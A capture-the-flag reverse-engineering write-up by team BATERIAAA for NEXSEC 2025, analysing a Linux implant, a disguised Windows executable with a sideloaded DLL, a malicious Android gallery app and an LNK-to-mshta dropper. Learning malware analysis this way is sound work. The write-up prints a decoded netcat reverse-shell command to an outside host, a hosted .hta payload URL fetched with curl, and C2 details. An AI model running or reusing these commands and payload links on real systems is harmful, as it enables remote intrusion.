# NEXSEC 2025 - Reverse Engineering

**CTF:** NEXSEC 2025  
**Team:** BATERIAAA  
**Category:** Reverse Engineering

---

## Residual Implant

Checked the main function in the implant file using Binary Ninja. The key was a decrypt loop using a seeded PRNG value (`rdx_5 = 0x905a4d`).

The loop at `i = 5 .. 0x265 step 2` XORs bytes to produce:
- A function name string (used by `dlsym`)
- A command string (used in `snprintf("%s >/dev/null 2>&1", var_2298+4)`)

The execution chain: `dlopen(NULL, 1)` -> `dlsym(handle, __symbol)` -> `fn(__big)` runs the command.

Going to `data_100001c00`, dumping and decoding the bytes revealed:

```
bash -c "nc Pvt3QG28pg.capturextheflag.io 4444 -e /bin/sh"
```

**Flag:** `Pvt3QG28pg.capturextheflag.io`

---

## Advisory Deception #1

Static analysis showed the executable dynamically loads a DLL using `LoadLibraryA`. The name matches a legitimate Microsoft Visual C++ runtime library.

```bash
strings "Internet Protocol Governance & Standards Advisory - March 2025.docx.exe" | grep -i dll
```

**Flag:** `vcruntime140.dll`

---

## Advisory Deception #2

```bash
strings vcruntime140.dll | grep -i ProgramData
```

**Flag:** `C:\ProgramData\MicrosoftSyncService\`

---

## Advisory Deception #3

```bash
objdump -p vcruntime140.dll | grep -i export -A20
```

**Flag:** `__vcrt_InitializeCriticalSectionEx`

---

## Advisory Deception #4

Checked the main function -- `accepteula` looked interesting. `_CreateFrameInfo()` is likely the beacon stage where C2 is located, found in `vcruntime140.dll`.

Checked hex data in `_createFrameInfo` function, then the `sub_25d7f22d1` function holding the hex data. Created a Python script to reverse the function with the hex blob.

The decrypted output revealed a PowerShell command downloading from tinyurl and connecting to a powercat C2:

```
fj3m58a9.capturextheflag.io
```

**Flag:** `nexsec25{fj3m58a9.capturextheflag.io}`

---

## Stolen Credentials (SOSO Challenge)

The `soso.exe` uses Salsa20 encryption. For the `-e` flag:

1. `salsa20_block(&_KEY, &_NONCE, 0, &var_258)` generates 64 bytes of keystream
2. Extracted the global `_KEY`
3. Created a script to bind with `password.txt`

```bash
python3 soso.py
```

**Flag:** `QWERTYasdfg12345!@#$%`

---

## Photo Viewer Gone Rogue

A malicious APK disguised as a photo gallery app.

**Analysis steps:**

1. **Manifest & Permissions** - Decompiled with JADX-GUI, entry point `com.dot.gallery.GalleryApp`
2. **Logic Bomb** - `GalleryApp.onCreate()` launches a background coroutine checking for emulator vs real device
3. **AES-ECB Decryption** - Decrypted C2 URL from `strings.xml` using key from `R.string.media_unlock`
4. **Payload Download** - Downloaded Base64+AES encrypted content from GitHub URL
5. **DEX Header Fix** - Decrypted `force_payload.dex` had bad checksum (Adler-32), patched the header
6. **Final Flag** - Decompiled `fixed_payload.dex` revealed a keylogger with `printFlag()` containing one more encrypted string

Key: `sup453cu24k3yYo_ju57f021h4ck2024`

**Flag found after final AES decryption.**

---

## Birthday Trap

Static analysis of `Happy_Birthday.png.lnk` (extension spoofing - `.lnk` with custom icon).

```bash
file Happy_Birthday.png.lnk
exiftool Happy_Birthday.png.lnk
```

Command Line Arguments revealed: `https://wonderpetak.github.io/W0nderpet4k/M.hta`

Attack chain: `.lnk` -> `mshta.exe` -> downloads and executes `M.hta`

```bash
curl https://wonderpetak.github.io/W0nderpet4k/M.hta
```

Found dropper logic downloading `wct9D39.jpg`, decoded in CyberChef:
1. From Base64
2. XOR with key `42` (Hex)

**Flag:** `nexsec2025{P0w3rSh3ll_C0mm3nt5_H1d3_S3cr3ts!}`
